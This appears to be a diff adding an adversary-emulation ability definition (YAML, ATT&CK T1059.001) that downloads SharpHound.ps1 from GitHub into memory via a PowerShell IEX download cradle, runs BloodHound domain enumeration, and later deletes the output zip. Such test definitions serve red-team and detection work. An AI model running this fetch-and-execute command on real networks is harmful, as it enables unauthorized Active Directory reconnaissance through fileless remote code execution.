@@ -1,0 +1,28 @@
+---
+- id: 0ecc3d4729cf37c719528291d63f9f99
+  name: Run Bloodhound from Memory using Download Cradle
+  description: 'Upon execution SharpHound will load into memory and execute against
+    a domain. It will set up collection methods, run and then compress and store the
+    data to the temp directory. If system is unable to contact a domain, proper execution
+    will not occur.
+
+
+    Successful execution will produce stdout message stating "SharpHound Enumeration
+    Completed". Upon completion, final output will be a *BloodHound.zip file.
+
+    '
+  tactic: execution
+  technique:
+    attack_id: T1059.001
+    name: 'Command and Scripting Interpreter: PowerShell'
+  platforms:
+    windows:
+      psh:
+        command: write-host "Remote download of SharpHound.ps1 into memory, followed
+          by execution of the script" -ForegroundColor Cyan; IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
+          Invoke-BloodHound -OutputDirectory $env:Temp; Start-Sleep 5
+        payloads: []
+        cleanup: Remove-Item $env:Temp\*BloodHound.zip -Force
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
